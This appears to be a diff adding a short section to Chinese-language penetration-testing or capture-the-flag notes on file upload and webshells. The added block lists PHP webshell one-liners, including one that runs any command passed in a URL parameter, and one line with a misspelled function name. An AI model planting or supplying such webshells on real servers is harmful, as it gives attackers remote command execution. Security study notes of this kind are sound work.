@@ -25,7 +25,14 @@
 3. 尋找上傳路徑  
 
 4. webshell 作用   
-
+  
+### webshell
+```php
+<?php system('ls'); ?>
+<?php system(ls); ?>
+<?php system($_GET['cmd']); ?>
+<?php systme($_GET[1]); ?>
+```
 
 ### SQL inj to webshell
 MYSQL:  
